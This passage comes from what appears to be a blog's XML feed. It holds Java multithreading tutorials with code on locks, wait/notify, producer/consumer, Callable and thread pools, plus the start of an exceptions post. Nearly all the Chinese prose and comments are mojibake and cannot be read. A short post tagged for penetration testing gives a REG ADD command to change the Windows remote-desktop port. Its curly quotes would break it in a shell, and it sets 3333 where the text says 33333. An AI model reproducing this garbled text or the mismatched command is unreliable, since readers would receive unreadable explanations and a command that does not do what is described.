1.å®ä¾‹åŒ–ä¸€ä¸ªReentrantLockå¯¹è±¡(è‹¥è®¾ç½®ä¸ºtrueï¼Œä¸ºå…¬å¹³ï¼Œå…ˆè¿›å…ˆå‡ºï¼›ä¸å†™å°±æ˜¯false) 2.è°ƒç”¨lock()é”å®šæ–¹æ³• 3.è°ƒç”¨è§£é”æ–¹æ³•unlock() é¢è¯•é¢˜ï¼šsynchronizedä¸lockå¼‚åŒ åŒï¼šäºŒè€…éƒ½å¯ä»¥è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜ å¼‚ï¼šsynchronizedæœºåˆ¶åœ¨æ‰§è¡Œå®Œç›¸åº”çš„åŒæ­¥ä»£ç ä¹‹åï¼Œè‡ªåŠ¨é‡Šæ”¾åŒæ­¥ç›‘è§†å™¨ Lockéœ€è¦æ‰‹åŠ¨çš„å¯åŠ¨åŒæ­¥(lock())ï¼ŒåŒæ—¶ç»“æŸåŒæ—¶ä¹Ÿéœ€è¦æ‰‹åŠ¨çš„å®ç°(unlock()) å»ºè®®ä¼˜å…ˆç”¨Lockè¿™ç§æ‰‹åŠ¨æ–¹å¼ ä¼˜å…ˆä½¿ç”¨é¡ºåºï¼š Lock â†’åŒæ­¥ä»£ç å—ï¼ˆå·²ç»è¿›å…¥äº†æ–¹æ³•ä½“ï¼Œåˆ†é…äº†ç›¸åº”èµ„æºï¼‰â†’åŒæ­¥æ–¹æ³•ï¼ˆåœ¨æ–¹æ³•ä½“ä¹‹å¤–) * */ public class LuckTest2 { public static void main(String[] args) { Window w = new Window(); Thread t1 = new Thread(w); Thread t2 = new Thread(w); Thread t3 = new Thread(w); t1.setName("çª—å£1"); t2.setName("çª—å£2"); t3.setName("çª—å£3"); t1.start(); t2.start(); t3.start(); } } class Window implements Runnable{ private int ticket = 100; // 1.å®ä¾‹åŒ–ä¸€ä¸ªReentrantLockå¯¹è±¡(è‹¥è®¾ç½®ä¸ºtrueï¼Œä¸ºå…¬å¹³ï¼Œå…ˆè¿›å…ˆå‡ºï¼›ä¸å†™å°±æ˜¯false) private ReentrantLock lock = new ReentrantLock(true); @Override public void run() { while (true){ try{ //2.è°ƒç”¨lock()é”å®šæ–¹æ³• lock.lock(); if (ticket > 0){ try { Thread.sleep(100); //å…ˆåŠ äº†sleepå¼ºåˆ¶é˜»å¡ï¼Œè®©å‡ºç°é”™ç¥¨çš„æ¦‚ç‡æå‡äº† } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + ":å–ç¥¨ï¼Œç¥¨å·ä¸ºï¼š" + ticket); ticket--; }else { break; } }finally { // 3.è°ƒç”¨è§£é”æ–¹æ³•unlock() lock.unlock(); } } } } synchronizedä¸Lockï¼ŒäºŒè€…å¯¹æ¯”ï¼š Lockæ˜¯æ˜¾å¼é”ï¼ˆæ‰‹åŠ¨å¼€å¯å’Œå…³é—­é”ï¼Œåˆ«å¿˜è®°å…³é—­é”ï¼‰ï¼Œsynchronizedæ˜¯éšå¼é”ï¼Œå‡ºäº†ä½œç”¨åŸŸè‡ªåŠ¨é‡Šæ”¾ Lockåªæœ‰ä»£ç å—é”ï¼Œsynchronizedæœ‰ä»£ç å—é”å’Œæ–¹æ³•é” ä½¿ç”¨Locké”ï¼ŒJVMå°†èŠ±è´¹è¾ƒå°‘çš„æ—¶é—´æ¥è°ƒåº¦çº¿ç¨‹ï¼Œæ€§èƒ½æ›´å¥½ã€‚å¹¶ä¸”å…·æœ‰æ›´å¥½çš„æ‰©å±•æ€§(æä¾›æ›´å¤šçš„å­ç±») ä¼˜å…ˆä½¿ç”¨é¡ºåº:Lock â†’åŒæ­¥ä»£ç å—ï¼ˆå·²ç»è¿›å…¥äº†æ–¹æ³•ä½“ï¼Œåˆ†é…äº†ç›¸åº”èµ„æºï¼‰â†’åŒæ­¥æ–¹æ³•(åœ¨æ–¹æ³•ä½“ä¹‹å¤–)| çº¿ç¨‹çš„é€šä¿¡ å…¶å®å°±æ˜¯å‡ ä¸ªæ–¹æ³•çš„ä½¿ç”¨ package cn.xpshuai.java3; /** * @author: å‰‘èƒ†ç´å¿ƒ * @createï¼š 2021-01-17 14:12 * @åŠŸèƒ½ï¼šçº¿ç¨‹é€šä¿¡çš„ä¾‹å­ï¼Œä¸€ä¸ªçº¿ç¨‹æ‰“å°å¶æ•°ï¼Œä¸€ä¸ªçº¿ç¨‹æ‰“å°å¥‡æ•°, äº¤æ›¿æ‰“å° * * *è®¾è®¡åˆ°çš„ä¸‰ä¸ªæ–¹æ³•ï¼š * wait():ä¸€æ—¦æ‰§è¡Œæ­¤æ–¹æ³•ï¼Œå½“å‰çº¿ç¨‹å°±è¿›å…¥é˜»å¡çŠ¶æ€ï¼Œå¹¶é‡Šæ”¾åŒæ­¥ç›‘è§†å™¨ * notify(): ä¸€æ—¦æ‰§è¡Œæ­¤æ–¹æ³•ï¼Œå°±ä¼šå”¤é†’è¢«waitçš„ä¸€ä¸ªçº¿ç¨‹ã€‚å¦‚æœæœ‰å¤šä¸ªçº¿ç¨‹è¢«waitï¼Œå°±å”¤é†’ä¼˜å…ˆçº§é«˜çš„é‚£ä¸ªã€‚ * notify():ä¸€æ—¦æ‰§è¡Œæ­¤æ–¹æ³•,å°±ä¼šå”¤é†’æ‰€æœ‰è¢«waitçš„çº¿ç¨‹ã€‚ * * è¯´æ˜ï¼š * 1.wait(),notify(),notify()ä»¥ä¸Šä¸‰ä¸ªæ–¹æ³•å¿…é¡»å‡ºç°åœ¨åŒæ­¥ä»£ç å—æˆ–è€…åŒæ­¥æ–¹æ³•å½“ä¸­ï¼Œä¸èƒ½ç”¨åœ¨lock()çš„æƒ…å†µä¸‹ * 2.è¿™ä¸‰ä¸ªæ–¹æ³•çš„è°ƒç”¨è€…å¿…é¡»æ˜¯åŒæ­¥ä»£ç å—æˆ–è€…åŒæ­¥æ–¹æ³•å½“ä¸­çš„åŒæ­¥ç›‘è§†å™¨ï¼Œå¦åˆ™ä¼šå‡ºå¼‚å¸¸ * 3.è¿™ä¸‰ä¸ªæ–¹æ³•æ˜¯å®šä¹‰åœ¨java.lang.Objectä¸­çš„ * */ public class NumTest { public static void main(String[] args) { Number n = new Number(); Thread t1 = new Thread(n); Thread t2 = new Thread(n); t1.setName("çº¿ç¨‹1"); t2.setName("çº¿ç¨‹2"); t1.start(); t2.start(); } } class Number implements Runnable{ private int number = 1; // Object obj = new Object(); @Override public void run() { while (true){ synchronized (this){ // synchronized (obj){ notify(); // 2.å”¤é†’å¦ä¸€ä¸ªçº¿ç¨‹ // this.notify(); // 2.å”¤é†’å¦ä¸€ä¸ªçº¿ç¨‹ // obj.notify(); // å¦‚æœåŒæ­¥ä»£ç å—ä¸­åŒæ­¥ç›‘è§†å™¨ä¸ºObjectï¼Œè°ƒç”¨è¿™ä¸ªæ–¹æ³•ä¹Ÿå¿…é¡»ä¸ºobj // notifyAll(); // å”¤é†’å…¶ä»–æ‰€æœ‰çº¿ç¨‹ if(number &lt;= 100){ System.out.println(Thread.currentThread().getName() + ":" + number); //æŸ¥çœ‹çº¿ç¨‹å number++; try { wait(); //1.è®©è°ƒç”¨wait()çš„çº¿ç¨‹è¿›å…¥é˜»å¡çŠ¶æ€ // obj.wait(); } catch (InterruptedException e) { e.printStackTrace(); } }else { break; } } } } } é¢è¯•é¢˜ï¼šsleep()å’Œwaitçš„å¼‚åŒ 1.ç›¸åŒç‚¹:ä¸€æ—¦æ‰§è¡Œæ–¹æ³•ï¼Œéƒ½å¯ä»¥ä½¿å¾—å½“å‰çš„çº¿ç¨‹è¿›å…¥é˜»å¡çŠ¶æ€ã€‚ 2.ä¸åŒç‚¹: 1ï¼‰ä¸¤ä¸ªæ–¹æ³•å£°æ˜çš„ä½ç½®ä¸åŒ:Threadç±»ä¸­å£°æ˜sleep() , objectç±»ä¸­å£°æ˜wait() 2ï¼‰è°ƒç”¨çš„è¦æ±‚ä¸åŒ: sleep()å¯ä»¥åœ¨ä»»ä½•éœ€è¦çš„åœºæ™¯ä¸‹è°ƒç”¨ã€‚è€Œwait()å¿…é¡»ä½¿ç”¨åœ¨åŒæ­¥ä»£ç å—æˆ–åŒæ­¥æ–¹æ³•ä¸­è°ƒç”¨ 3) å…³äºæ˜¯å¦é‡Šæ”¾åŒæ­¥ç›‘è§†å™¨ï¼Œå¦‚æœä¸¤ä¸ªæ–¹æ³•éƒ½ä½¿ç”¨åœ¨åŒæ­¥ä»£ç å—æˆ–åŒæ­¥æ–¹æ³•ä¸­ï¼Œsleep()ä¸ä¼šé‡Šæ”¾é”ï¼Œwait()ä¼šé‡Šæ”¾é”(åŒæ­¥ç›‘è§†å™¨) ç»å…¸ä¾‹é¢˜ï¼šç”Ÿäº§è€…/æ¶ˆè´¹è€…é—®é¢˜ package cn.xpshuai.java3; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-17 14:42 * @åŠŸèƒ½ï¼šç”Ÿäº§è€…/æ¶ˆè´¹è€…é—®é¢˜çš„ä¾‹å­ * * * ç”Ÿäº§è€…(Productor)å°†äº§å“äº¤ç»™åº—å‘˜(CLerk)ï¼Œè€Œ * æ¶ˆè´¹è€…(Customer)ä»åº—å‘˜å¤„å–èµ°äº§å“ï¼Œ * åº—å‘˜ä¸€æ¬¡åªèƒ½æŒæœ‰å›ºå®šæ•°é‡çš„äº§å“(æ¯”å¦‚:20)ï¼Œ * å¦‚æœç”Ÿäº§è€…è¯•å›¾ç”Ÿäº§æ›´å¤šçš„äº§å“ï¼Œåº—å‘˜ä¼šå«ç”Ÿäº§è€…åœä¸€ä¸‹ï¼Œ * å¦‚æœåº—ä¸­æœ‰ç©ºä½æ”¾äº§å“äº†å†é€šçŸ¥ç”Ÿäº§è€…ç»§ç»­ç”Ÿäº§ï¼Œ * å¦‚æœåº—ä¸­æ²¡æœ‰äº§å“äº†ï¼Œåº—å‘˜ä¼šå‘Šè¯‰æ¶ˆè´¹è€…ç­‰ä¸€ä¸‹ï¼Œ * å¦‚æœåº—ä¸­æœ‰äº§å“äº†å†é€šçŸ¥æ¶ˆè´¹è€…æ¥å–èµ°äº§å“ã€‚ * * * æ¶‰åŠï¼šåŒæ­¥æœºåˆ¶ã€å¤šçº¿ç¨‹é€šä¿¡ * * */ public class ProducerCustomer { public static void main(String[] args) { Clerk clerk = new Clerk(); //è¿™ä¸ªå¯¹è±¡è‡ªå§‹è‡³ç»ˆåªé€ äº†ä¸€ä¸ª Producer p1 = new Producer(clerk); p1.setName("ç”Ÿäº§è€…1"); Customer c1 = new Customer(clerk); c1.setName("æ¶ˆè´¹è€…1"); p1.start(); c1.start(); } } class Clerk{ private int productCount = 0; //ç”Ÿäº§äº§å“ public synchronized void produceProduct() { //ç”¨åŒæ­¥æ–¹æ³• if(productCount &lt; 20){ productCount++; System.out.println(Thread.currentThread().getName() + ":å¼€å§‹ç”Ÿäº§ç¬¬" + productCount + "ä¸ªäº§å“"); notify(); //å”¤é†’æ¶ˆè´¹è€… }else { //ç­‰å¾… try{ wait(); }catch (InterruptedException e){ e.printStackTrace(); } } } //æ¶ˆè´¹äº§å“ public synchronized void consumeProduct(){ if(productCount > 0){ System.out.println(Thread.currentThread().getName() + ":å¼€å§‹æ¶ˆè´¹ç¬¬" + productCount + "ä¸ªäº§å“"); productCount--; notify(); //å”¤é†’ç”Ÿäº§è€… }else { //ç­‰å¾… try{ wait(); }catch (InterruptedException e){ e.printStackTrace(); } } } } class Producer extends Thread{ //ç”Ÿäº§è€… private Clerk clerk; public Producer(Clerk clerk) { this.clerk = clerk; } @Override public void run() { System.out.println(Thread.currentThread().getName() + ":å¼€å§‹ç”Ÿäº§äº§å“..."); while (true){ clerk.produceProduct(); } } } class Customer extends Thread{ //æ¶ˆè´¹è€… private Clerk clerk; public Customer(Clerk clerk) { this.clerk = clerk; } @Override public void run() { System.out.println(Thread.currentThread().getName() + ":å¼€å§‹æ¶ˆè´¹äº§å“..."); while (true){ clerk.consumeProduct(); } } } JDK5.0æ–°å¢çº¿ç¨‹åˆ›å»ºæ–¹å¼ 2ç§æ–¹æ³• æ–¹æ³•3ï¼šå®ç°Callableæ¥å£ä¸ä½¿ç”¨Runnableç›¸æ¯”ï¼ŒCallableåŠŸèƒ½æ›´å¼ºå¤§äº›ï¼š ç›¸æ¯”é‡å†™run()æ–¹æ³•ï¼Œå¯ä»¥æœ‰è¿”å›å€¼(é‡å†™call()æ–¹æ³•) æ–¹æ³•å¯ä»¥æŠ›å‡ºå¼‚å¸¸ æ”¯æŒæ³›å‹çš„è¿”å›å€¼ éœ€è¦å€ŸåŠ©FutureTaskç±»ï¼Œæ¯”å¦‚è·å–è¿”å›ç»“æœ Futureæ¥å£ï¼š å¯ä»¥å¯¹å…·ä½“Runnableã€Callableä»»åŠ¡çš„æ‰§è¡Œç»“æœè¿›è¡Œå–æ¶ˆã€æŸ¥è¯¢æ˜¯å¦å®Œæˆã€è·å–ç»“æœç­‰ï¼› FutrueTaskæ˜¯Futrueæ¥å£çš„å”¯ä¸€çš„å®ç°ç±» FutureTaskåŒæ—¶å®ç°äº†Runnable,Futureæ¥å£ã€‚å®ƒæ—¢å¯ä»¥ä½œä¸ºRunnableè¢«çº¿ç¨‹æ‰§è¡Œï¼Œåˆå¯ä»¥ä½œä¸ºFutureå¾—åˆ°Callableçš„è¿”å›å€¼ package cn.xpshuai.java3; import java.util.concurrent.Callable; import java.util.concurrent.ExecutionException; import java.util.concurrent.FutureTask; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-17 15:0 * @åŠŸèƒ½ï¼šåˆ›å»ºçº¿ç¨‹çš„æ–¹å¼ä¸‰: å®ç°Callableæ¥å£ -- JDK5.0æ–°å¢ * * *æ­¥éª¤ï¼š *1.åˆ›å»ºä¸€ä¸ªCallableçš„å®ç°ç±» *2.å®ç°callæ–¹æ³•ï¼Œå°†æ­¤çº¿ç¨‹éœ€è¦æ‰§è¡Œçš„æ“ä½œå£°æ˜åœ¨call()ä¸­ *3.åˆ›å»ºCallableæ¥å£å®ç°ç±»çš„å¯¹è±¡ *4.å°†æ­¤Callableæ¥å£å®ç°ç±»çš„å¯¹è±¡ä½œä¸ºä¼ é€’åˆ°FutureTaskæ„é€ å™¨ä¸­ï¼Œåˆ›å»ºFutureTaskçš„å¯¹è±¡ *5.å°†FutureTaskçš„å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œä¼ é€’åˆ°Threadç±»çš„æ„é€ å™¨ä¸­ï¼Œåˆ›å»ºThreadå¯¹è±¡ï¼Œå¹¶è°ƒç”¨start() *6.è·å–Callableä¸­call()æ–¹æ³•çš„è¿”å›å€¼ * * * å¦‚ä½•ç†è§£å®ç°Callableæ¥å£çš„æ–¹å¼åˆ›å»ºå¤šçº¿ç¨‹ï¼Œæ¯”å®ç°Runnableæ¥å£åˆ›å»ºå¤šçº¿ç¨‹æ–¹å¼å¼ºå¤§ï¼Ÿ * 1.call()å¯ä»¥ç”±è¿”å›å€¼ * 2.call()å¯ä»¥æŠ›å‡ºå¼‚å¸¸ï¼Œè¢«å¤–é¢çš„æ“ä½œæ•è·ï¼Œè·å–å¼‚å¸¸çš„ä¿¡æ¯ * 3.Callableæ˜¯æ”¯æŒæ³›å‹çš„ * * * * */ public class CallableTest { public static void main(String[] args) { // 3.åˆ›å»ºCallableæ¥å£å®ç°ç±»çš„å¯¹è±¡ NumThread n1 = new NumThread(); // 4.å°†æ­¤Callableæ¥å£å®ç°ç±»çš„å¯¹è±¡ä½œä¸ºä¼ é€’åˆ°FutureTaskæ„é€ å™¨ä¸­ï¼Œåˆ›å»ºFutureTaskçš„å¯¹è±¡ FutureTask futureTask = new FutureTask(n1); // FutureTask&lt;Integer> futureTask = new FutureTask&lt;Integer>(n1); // 5.å°†FutureTaskçš„å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œä¼ é€’åˆ°Threadç±»çš„æ„é€ å™¨ä¸­ï¼Œåˆ›å»ºThreadå¯¹è±¡ï¼Œå¹¶è°ƒç”¨start() new Thread(futureTask).start(); try { // 6.è·å–Callableä¸­call()æ–¹æ³•çš„è¿”å›å€¼ //get()è¿”å›å€¼å³ä¸ºFutureTaskæ„é€ å™¨å‚æ•°Callableå®ç°ç±»é‡å†™çš„çš„call()çš„è¿”å›å€¼ Object sum = futureTask.get(); //è·å–å›è°ƒæ–¹æ³•çš„è¿”å›å€¼, å¦‚æœå¯¹è¿”å›å€¼ä¸æ„Ÿå…´è¶£å¯ä»¥ä¸ç”¨è°ƒç”¨è¿™ä¸ªget() // Integer sum = futureTask.get(); System.out.println("æ€»å’Œä¸ºï¼š" + sum); } catch (InterruptedException e) { e.printStackTrace(); } catch (ExecutionException e) { e.printStackTrace(); } } } //1.åˆ›å»ºä¸€ä¸ªCallableçš„å®ç°ç±» class NumThread implements Callable{ //class NumThread implements Callable&lt;Integer>{ // 2.å®ç°callæ–¹æ³•ï¼Œå°†æ­¤çº¿ç¨‹éœ€è¦æ‰§è¡Œçš„æ“ä½œå£°æ˜åœ¨call()ä¸­ @Override public Object call() throws Exception { // public Integer call() throws Exception { int sum = 0; for (int i = 0; i &lt; 100; i++) { if (i % 2 == 0){ System.out.println(i); sum += i; } } return sum; } } æ–¹æ³•4ï¼šçº¿ç¨‹æ±  å¼€å‘ä¸­ï¼Œå¸¸ç”¨è¿™ä¸ªæ–¹æ³• èƒŒæ™¯: ç»å¸¸åˆ›å»ºå’Œé”€æ¯ã€ä½¿ç”¨é‡ç‰¹åˆ«å¤§çš„èµ„æºï¼Œæ¯”å¦‚å¹¶å‘æƒ…å†µä¸‹çš„çº¿ç¨‹ï¼Œå¯¹æ€§èƒ½å½±å“å¾ˆå¤§ã€‚ æ€è·¯: æå‰åˆ›å»ºå¥½å¤šä¸ªçº¿ç¨‹ï¼Œæ”¾å…¥çº¿ç¨‹æ± ä¸­ï¼Œä½¿ç”¨æ—¶ç›´æ¥è·å–ï¼Œä½¿ç”¨å®Œæ”¾å›æ± ä¸­ã€‚å¯ä»¥é¿å…é¢‘ç¹åˆ›å»ºé”€æ¯ã€å®ç°é‡å¤åˆ©ç”¨ã€‚ç±»ä¼¼ç”Ÿæ´»ä¸­çš„å…¬å…±äº¤é€šå·¥å…·ã€‚ å¥½å¤„: æé«˜å“åº”é€Ÿåº¦ï¼ˆå‡å°‘äº†åˆ›å»ºæ–°çº¿ç¨‹çš„æ—¶é—´) é™ä½èµ„æºæ¶ˆè€—ï¼ˆé‡å¤åˆ©ç”¨çº¿ç¨‹æ± ä¸­çº¿ç¨‹,ä¸éœ€è¦æ¯æ¬¡éƒ½åˆ›å»º) ä¾¿äºçº¿ç¨‹ç®¡ç† corePoolSize: æ ¸å¿ƒæ± çš„å¤§å° maximumPoolSize: æœ€å¤§çº¿ç¨‹æ•° keepAliveTime: çº¿ç¨‹æ²¡æœ‰ä»»åŠ¡æ—¶æœ€å¤šä¿æŒå¤šé•¿æ—¶é—´åä¼šç»ˆæ­¢ â€¦ â€¦ package cn.xpshuai.java3; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.ThreadPoolExecutor; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-17 15:37 * @åŠŸèƒ½ï¼šåˆ›å»ºçº¿ç¨‹çš„æ–¹å¼4ï¼šçº¿ç¨‹æ±  * * ã€æ­¥éª¤ã€‘ * 1.æä¾›æŒ‡å®šçº¿ç¨‹æ•°é‡çš„çº¿ç¨‹æ±  * 2.æ‰§è¡ŒæŒ‡å®šçš„çº¿ç¨‹çš„æ“ä½œï¼Œéœ€è¦æä¾›å®ç°äº†Runnableæ¥å£æˆ–Callableæ¥å£å®ç°ç±»çš„å¯¹è±¡ * 3.å…³é—­çº¿ç¨‹æ±  * * ã€å¥½å¤„ã€‘ * - æé«˜å“åº”é€Ÿåº¦ï¼ˆå‡å°‘äº†åˆ›å»ºæ–°çº¿ç¨‹çš„æ—¶é—´) * - é™ä½èµ„æºæ¶ˆè€—ï¼ˆé‡å¤åˆ©ç”¨çº¿ç¨‹æ± ä¸­çº¿ç¨‹,ä¸éœ€è¦æ¯æ¬¡éƒ½åˆ›å»º) * - ä¾¿äºçº¿ç¨‹ç®¡ç† * * * * æ–°æ‰‹æœ¬ä¾‹å­å¯èƒ½å‡ºç°çš„é—®é¢˜ï¼šhttp://www.voidcn.com/article/p-zkcigdhf-bud.html * */ public class ThreadPool { public static void main(String[] args) { // 1.æä¾›æŒ‡å®šçº¿ç¨‹æ•°é‡çš„çº¿ç¨‹æ±  ExecutorService service = Executors.newFixedThreadPool(10); // newFixedThreadPoolæ–¹æ³•æ˜¯ç±»Executorsçš„é™æ€æ–¹æ³•. // è®¾ç½®çº¿ç¨‹æ± çš„å±æ€§, è¿™é‡Œ System.out.println(service.getClass()); // class java.util.concurrent.ThreadPoolExecutor ThreadPoolExecutor service1 = (ThreadPoolExecutor)service; // å¿…é¡»å¼ºè½¬ä¸ºè¿™ç§å½¢å¼æ‰èƒ½è®¾ç½®å±æ€§ // service1.setCorePoolSize(15); // service1.setKeepAliveTime(1000); // 2.æ‰§è¡ŒæŒ‡å®šçš„çº¿ç¨‹çš„æ“ä½œï¼Œéœ€è¦æä¾›å®ç°äº†Runnableæ¥å£æˆ–Callableæ¥å£å®ç°ç±»çš„å¯¹è±¡ service.execute(new NumberThread()); //é€‚åˆä½¿ç”¨äºRunnable service.execute(new NumberThread2()); //é€‚åˆä½¿ç”¨äºRunnable // service.submit(Callable callable); //é€‚åˆä½¿ç”¨äºCallable // 3.å…³é—­çº¿ç¨‹æ±  service.shutdown(); } } class NumberThread implements Runnable{ @Override public void run() { for (int i = 0; i &lt;= 100; i++) { if (i % 2 == 0) { System.out.println(Thread.currentThread().getName() + "å¶æ•°ï¼š" + i); } } } } class NumberThread2 implements Runnable{ @Override public void run() { for (int i = 0; i &lt;= 100; i++) { if (i % 2 != 0) { System.out.println(Thread.currentThread().getName() + "å¥‡æ•°ï¼š" + i); } } } } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Javaå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>å¤šçº¿ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸€æ¡å‘½ä»¤ä¿®æ”¹windowsæ³¨å†Œè¡¨]]></title>
    <url>%2Fposts%2F48777%2F</url>
    <content type="text"><![CDATA[åœ¨ç½‘ä¸Šçœ‹åˆ°å¤§ä½¬ä»¬çš„æ–‡ç« ï¼Œæˆ‘ä¹Ÿåœ¨æ­¤è®°å½•ä»¥ä¸‹ è¿™é‡Œä»¥ä¿®æ”¹windowsè¿œç¨‹æ¡Œé¢ç«¯å£3389ä¸º33333ä¸ºä¾‹å­ã€‚ ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š REG ADD â€œHKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcpâ€ /v â€œPortNumberâ€ /t REG_DWORD /d 3333 /f document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>æ³¨å†Œè¡¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javaå­¦ä¹ ä¹‹å¼‚å¸¸]]></title>
    <url>%2Fposts%2F39908%2F</url>
    <content type="text"><![CDATA[å¸¸è§å¼‚å¸¸ Errorï¼šJavaè™šæ‹Ÿæœºæ— æ³•è§£å†³çš„ä¸¥é‡é—®é¢˜ï¼Œå¦‚StackOverflowErroeç­‰ï¼Œä¸€èˆ¬ä¸ç¼–å†™é’ˆå¯¹æ€§ä»£ç è¿›è¡Œå¤„ç† Exceptionï¼šå…¶å®ƒå› ç¼–ç¨‹é”™è¯¯æˆ–å¶ç„¶çš„å¤–åœ¨å› ç´ å¯¼è‡´çš„ä¸€èˆ¬æ€§é—®é¢˜ï¼Œå¯ä»¥ä¼ç”¨é’ˆå¯¹æ€§çš„ä»£ç è¿›è¡Œå¤„ç†ã€‚ä¾‹å¦‚ï¼šç©ºæŒ‡é’ˆè®¿é—®ã€è¯•å›¾è¯»å–ä¸å­˜åœ¨çš„æ–‡ä»¶ã€ç½‘ç»œè¿æ¥ä¸­æ–­ã€æ•°ç»„è§’æ ‡è¶Šç•Œç­‰ åˆ†ç±»ï¼š ç¼–è¯‘æ—¶å¼‚å¸¸ è¿è¡Œæ—¶å¼‚å¸¸ æ•è·é”™è¯¯æœ€ç†æƒ³çš„æ˜¯åœ¨ç¼–è¯‘æœŸé—´ã€‚ å¼‚å¸¸å¤„ç†1ï¼štry-catch-finallypackage cn.xpshuai.day12; /* å¼‚å¸¸å¤„ç†æœºåˆ¶ Error: JVMç³»ç»Ÿå†…éƒ¨é”™è¯¯,ä¸€èˆ¬ä¸ä¸ç¼–å†™é’ˆå¯¹æ€§ä»£ç è¿›è¡Œå¤„ç† æ¯”å¦‚æ ˆæº¢å‡ºï¼ŒOOMï¼ˆå †ç©ºé—´æº¢å‡ºï¼‰ Exception: ç¼–è¯‘æ—¶å¼‚å¸¸ï¼šç¼–è¯‘å™¨ä¼šè‡ªåŠ¨å˜çº¢å‰, javacä¼šå¼‚å¸¸ï¼Œä¸ä¼šç”Ÿæˆå­—èŠ‚ç æ–‡ä»¶éƒ½ è¿è¡Œæ—¶å¼‚å¸¸ï¼š å¼‚å¸¸çš„å¤„ç†:æŠ“æŠ›æ¨¡å‹ è¿‡ç¨‹ä¸€:"æŠ›":ç¨‹åºåœ¨æ­£å¸¸æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œä¸€æ—¦å‡ºç°å¼‚å¸¸ï¼Œå°±ä¼šåœ¨å¼‚å¸¸ä»£ç å¤„ç”Ÿæˆä¸€ä¸ªå¯¹åº”å¼‚å¸¸ç±»çš„å¯¹è±¡ã€‚ å¹¶å°†æ­¤å¯¹è±¡æŠ›å‡ºã€‚ ä¸€æ—¦æŠ›å‡ºå¯¹è±¡ä»¥åï¼Œå…¶åçš„ä»£ç å°±ä¸å†æ‰§è¡Œã€‚ è¿‡ç¨‹äºŒ:"æŠ“":å¯ä»¥ç†è§£ä¸ºå¼‚å¸¸çš„å¤„ç†æ–¹å¼: 1.try-catch-finally 2.throws try-catch-finallyä½¿ç”¨ try{ å¯èƒ½å‡ºç°å¼‚å¸¸çš„ä»£ç  }catch(å¼‚å¸¸ç±»å‹1 å˜é‡å1){ }catch(å¼‚å¸¸ç±»å‹2 å˜é‡å2){ }catch(å¼‚å¸¸ç±»å‹3 å˜é‡å3){ }finally{ ä¸€å®šä¼šæ‰§è¡Œçš„ä»£ç æ”¾åœ¨è¿™é‡Œ } è¯´æ˜ï¼š 1.finallyæ˜¯å¯é€‰çš„ã€‚ 2ï¼ä½¿ç”¨tryå°†å¯èƒ½å‡ºç°å¼‚å¸¸ä»£ç åŒ…è£…èµ·æ¥ï¼Œåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¸€æ—¦å‡ºç°å¼‚å¸¸ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªå¯¹åº”å¼‚å¸¸ç±»çš„å¯¹è±¡ï¼Œæ ¹æ®æ­¤å¯¹è±¡ çš„ç±»å‹ï¼Œå»catchä¸­è¿›è¡ŒåŒ¹é… 3.catchä¸­çš„å¼‚å¸¸ç±»å‹å¦‚æœæ²¡æœ‰å­çˆ¶ç±»å…³ç³»ï¼Œåˆ™è°å£°æ˜åœ¨ä¸Šï¼Œè°å£°æ˜åœ¨ä¸‹æ— æ‰€è°“ã€‚ catchä¸­çš„å¼‚å¸¸ç±»å‹å¦‚æœæ»¡è¶³å­çˆ¶ç±»å…³ç³»ï¼Œåˆ™è¦æ±‚å­ç±»ä¸€å®šå£°æ˜åœ¨çˆ¶ç±»çš„ä¸Šé¢ã€‚å¦åˆ™ï¼ŒæŠ¥é”™ 4.å¸¸ç”¨çš„å¼‚å¸¸å¯¹è±¡å¤„ç†çš„æ–¹å¼: String getMessage() printstackTrace() 5.åœ¨tryç»“æ„ä¸­å£°æ˜çš„å˜é‡ï¼Œå†å‡ºäº†tryç»“æ„ä»¥åï¼Œå°±ä¸èƒ½å†è¢«è°ƒç”¨ 6.ä½“ä¼š:ä½¿ç”¨try-catch-finallyå¤„ç†ç¼–è¯‘æ—¶å¼‚å¸¸ï¼Œæ˜¯å¾—ç¨‹åºåœ¨ç¼–è¯‘æ—¶å°±ä¸å†æŠ¥é”™ï¼Œä½†æ˜¯è¿è¡Œæ—¶ä»å¯èƒ½æŠ¥é”™ã€‚ ç›¸å½“äºæˆ‘ä»¬ä½¿ç”¨try-catch-finallyå°†ä¸€ä¸ªç¼–è¯‘æ—¶å¯èƒ½å‡ºç°çš„å¼‚å¸¸,å»¶è¿Ÿåˆ°è¿è¡Œæ—¶å‡ºç°ã€‚ 7.finallyä¸­çš„æ˜¯ä¸€å®šä¼šæ‰§è¡Œçš„ä»£ç 